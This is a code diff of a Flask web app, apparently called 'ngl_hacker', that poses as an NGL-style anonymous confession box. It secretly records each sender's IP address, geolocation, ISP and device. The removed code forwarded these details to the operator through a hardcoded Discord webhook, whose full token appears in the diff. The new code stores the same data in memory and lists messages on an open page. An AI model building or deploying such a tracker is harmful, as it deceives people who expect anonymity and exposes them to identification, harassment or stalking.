@@ -4,19 +4,22 @@ import requests
 import os
 from datetime import datetime
 
-# Logging ayarları – hem dosyaya hem Render konsoluna yazsın
+# Logging ayarları
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s | %(levelname)s | %(message)s',
     handlers=[
         logging.FileHandler('ngl_hacker.log', encoding='utf-8'),
-        logging.StreamHandler()  # Render Logs'ta görünür
+        logging.StreamHandler()
     ]
 )
 
 app = Flask(__name__)
 
-# Tek sayfa HTML – kullanıcı adı + mesaj kutusu + alt yazı
+# Gelen mesajları burada tut (basit liste, sunucu yeniden başladığında sıfırlanır)
+messages = []
+
+# Ana sayfa HTML (kullanıcı adı + mesaj kutusu bir arada)
 HOME_HTML = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -110,6 +113,87 @@ HOME_HTML = """
 </html>
 """
 
+# Mesajlar sayfası HTML – kutucuklar burada listelenecek
+MESAJLAR_HTML = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>itiraf_ipal - Gelen Mesajlar</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #000000, #1a0033);
+            color: white;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 3rem;
+            margin-bottom: 30px;
+            background: linear-gradient(90deg, #ff00cc, #3333ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .message-box {
+            background: rgba(255,255,255,0.1);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .username {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #ff00cc;
+        }
+        .message {
+            font-size: 1.3rem;
+            margin-bottom: 10px;
+        }
+        .footer {
+            font-size: 0.9rem;
+            opacity: 0.7;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .share-btn {
+            background: #ff00cc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Gelen Mesajlar</h1>
+    {% for msg in messages %}
+        <div class="message-box">
+            <div class="username">@{{ msg.username or 'Anonim' }}</div>
+            <div class="message">{{ msg.message }}</div>
+            <div class="footer">NGL by itiraf_ipal admini :)</div>
+            <button class="share-btn" onclick="navigator.share({title: 'NGL Mesaj', text: '@{{ msg.username }}: {{ msg.message }}'})">Instagram'a Paylaş</button>
+        </div>
+    {% else %}
+        <p>Henüz mesaj yok.</p>
+    {% endfor %}
+</body>
+</html>
+"""
+
+# Gelen mesajları tutacak liste (sunucu yeniden başladığında sıfırlanır)
+messages = []
+
 @app.route('/', methods=['GET', 'POST'])
 def home():
     username = request.args.get('username', '') or request.form.get('username', '')
@@ -148,50 +232,24 @@ def home():
             logging.info(log_entry)
             print(f"[YENİ MESAJ] {log_entry}")
 
-            # Discord webhook – 2 kutu gönderme
-            discord_webhook = "https://discordapp.com/api/webhooks/1467529164444668037/u22KPPoEIghrxWupLJrwcDDUV3F8u-3b_Y_wOTOqpP7rA7lUJH6aKL1P85rUeuNAhq8z"  # ← SENİN WEBHOOK LINKİN (değiştirebilirsin)
-
-            if discord_webhook:
-                # 1. Kutusu: Temiz mesaj kutusu (Instagram story/post için ideal)
-                embed_mesaj = {
-                    "title": f"@{username or 'Anonim'}",
-                    "description": f"**{msg}**",
-                    "color": 0x9B59B6,  # mor-pembe NGL rengi
-                    "footer": {
-                        "text": "NGL by itiraf_ipal",
-                        "icon_url": ""  # istersen NGL logosu linki koy
-                    },
-                    "timestamp": datetime.now().isoformat()
-                }
-
-                # 2. Kutusu: Tam log (senin takip için)
-                embed_log = {
-                    "title": "Mesaj Logu 🔍",
-                    "color": 0x2C3E50,  # koyu renk
-                    "fields": [
-                        {"name": "Kullanıcı Adı", "value": f"@{username or 'Anonim'}", "inline": True},
-                        {"name": "Mesaj", "value": msg, "inline": False},
-                        {"name": "IP", "value": client_ip, "inline": True},
-                        {"name": "Konum", "value": location, "inline": True},
-                        {"name": "ISP", "value": isp, "inline": True},
-                        {"name": "Cihaz", "value": user_agent[:100], "inline": False}
-                    ],
-                    "footer": {
-                        "text": "Zaman: " + datetime.now().strftime("%d.%m.%Y %H:%M:%S")
-                    }
-                }
-
-                payload = {"embeds": [embed_mesaj, embed_log]}
-
-                try:
-                    requests.post(discord_webhook, json=payload)
-                    logging.info("[DISCORD] 2 kutu gönderildi (mesaj + log)")
-                except Exception as e:
-                    logging.error(f"[DISCORD HATASI] {str(e)}")
+            # Mesajı listeye ekle
+            messages.append({
+                "username": username or 'Anonim',
+                "message": msg,
+                "ip": client_ip,
+                "location": location,
+                "isp": isp,
+                "user_agent": user_agent,
+                "timestamp": datetime.now().strftime("%d.%m.%Y %H:%M:%S")
+            })
 
             return render_template_string(HOME_HTML, username=username, success=True)
 
     return render_template_string(HOME_HTML, username=username, success=False)
+
+@app.route('/mesajlar')
+def mesajlar():
+    return render_template_string(MESAJLAR_HTML, messages=messages)
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
